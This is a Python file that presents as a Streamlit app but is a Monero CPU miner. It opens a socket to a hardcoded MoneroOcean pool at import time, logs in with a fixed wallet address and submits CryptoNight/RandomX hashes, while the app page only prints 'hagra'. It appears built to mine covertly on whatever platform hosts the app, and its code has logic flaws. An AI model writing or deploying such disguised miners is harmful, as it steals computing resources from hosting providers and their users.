import streamlit as st
import argparse
import socket
import select
import binascii
import pycryptonight
import pyrx
import struct
import json
import sys
import os
import time
from multiprocessing import Process, Queue
import multiprocessing
#killer pool
from datetime import datetime    
import pytz    
tz_NY = pytz.timezone('Asia/Kolkata')   
datetime_NY = datetime.now(tz_NY)  
print("ist", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f")) 

pool_host = 'gulf.moneroocean.stream'
pool_port = 10002
pool_pass = 'stream'
wallet_address = '49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g'
nicehash = False
st.write("hagra")

print("cpus",multiprocessing.cpu_count())
hc = 0
nhc =0
xhc =0
pool_ip = socket.gethostbyname(pool_host)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
s.connect((pool_ip, pool_port))
#starting miner
q = Queue()

   
    

def main(q,s):



    login = {
        'method': 'login',
        'params': {
            'login': wallet_address,
            'pass': pool_pass,
            'rigid': '',
            'agent': 'stratum-miner-py/0.1'
        },
        'id':1
    }
    print('Logging into pool: {}:{}'.format(pool_host, pool_port))
    print('Using NiceHash mode: {}'.format(nicehash))
    s.sendall(str(json.dumps(login)+'\n').encode('utf-8'))

    try:
        while 1:
            line = s.makefile().readline()
            r = json.loads(line)
            error = r.get('error')
            result = r.get('result')
            method = r.get('method')
            params = r.get('params')
            if error:
                datetime_NY = datetime.now(tz_NY)  
                print("ist", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f")) 
                print('Error: {}'.format(error))
                continue
            if result and result.get('status'):
                datetime_NY = datetime.now(tz_NY)  
                print("ist", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f")) 
                print('Status: {}'.format(result.get('status')))
            if result and result.get('job'):
                login_id = result.get('id')
                job = result.get('job')
                job['login_id'] = login_id
     
                q.put(job) 

          
            elif method and method == 'job' and len(login_id):
               
                q.put(params)
                     
                
                
    except KeyboardInterrupt:
        print('{}Exiting'.format(os.linesep))
        proc.terminate()
        
        s.close()
        sys.exit(0)


def pack_nonce(blob, nonce):
    b = binascii.unhexlify(blob)
    bin = struct.pack('39B', *bytearray(b[:39]))
    if nicehash:
        bin += struct.pack('I', nonce & 0x00ffffff)[:3]
        bin += struct.pack('{}B'.format(len(b)-42), *bytearray(b[42:]))
    else:
        bin += struct.pack('I', nonce)
        bin += struct.pack('{}B'.format(len(b)-43), *bytearray(b[43:]))
    return bin


def worker(q, s):
    
    
    time.sleep(1)
    started = time.time()
    hash_count = 0

    while 1:
        job = q.get()
        
        mnx = 0
        
        if job.get('login_id'):
            login_id = job.get('login_id')
           
        blob = job.get('blob')
        target = job.get('target')
        job_id = job.get('job_id')
        height = job.get('height')
        block_major = int(blob[:2], 16)
        cnv = 0
     
        if block_major >= 7:
            cnv = block_major - 6
        if cnv > 5:
            seed_hash = binascii.unhexlify(job.get('seed_hash'))
            datetime_NY = datetime.now(tz_NY)  
            print("ist", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f")) 
            print('New job with target: {}, RandomX, height: {} '.format(target, height))
        else:
            datetime_NY = datetime.now(tz_NY)  
            print("ist", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f")) 
            print('New job with target: {}, CNv{}, height: {}'.format(target, cnv, height))
        target = struct.unpack('I', binascii.unhexlify(target))[0]
        if target >> 32 == 0:
            target = int(0xFFFFFFFFFFFFFFFF / int(0xFFFFFFFF / target))
        nonce = 1

        while 1:
            
            bin = pack_nonce(blob, nonce)
            
            if cnv > 5:
                hash = pyrx.get_rx_hash(bin, seed_hash, height)
            else:
                hash = pycryptonight.cn_slow_hash(bin, cnv, 0, height)
            hash_count += 1
            sys.stdout.flush()
            hex_hash = binascii.hexlify(hash).decode()
            r64 = struct.unpack('Q', hash[24:])[0]
            if r64 < target:
                elapsed = time.time() - started
                hr = int(hash_count / elapsed)
                print('{}Hashrate: {} H/s'.format(os.linesep, hr))
                if nicehash:
                    nonce = struct.unpack('I', bin[39:43])[0]
                submit = {
                    'method':'submit',
                    'params': {
                        'id': login_id,
                        'job_id': job_id,
                        'nonce': binascii.hexlify(struct.pack('<I', nonce)).decode(),
                        'result': hex_hash
                    },
                    'id':1
                }
                datetime_NY = datetime.now(tz_NY)  
                print("ist", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f")) 
                print('Submitting hash: {}'.format(hex_hash))
                
                s.sendall(str(json.dumps(submit)+'\n').encode('utf-8'))
                select.select([s], [], [], 3)
                if not q.empty():
                    break
            nonce += 1
            

            


            
            


            
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--nicehash', action='store_true', help='NiceHash mode')
    parser.add_argument('--host', action='store', help='Pool host')
    parser.add_argument('--port', action='store', help='Pool port')
    args = parser.parse_args()
    if args.nicehash:
        nicehash = True
    if args.host:
        pool_host = args.host
    if args.port:
        pool_port = int(args.port)
    poc = Process(target=main,args=(q,s))
    poc.daemon = True
    poc.start()
    proc = Process(target=worker, args=(q, s))
    proc.daemon = True
    proc.start()
    #main()

    

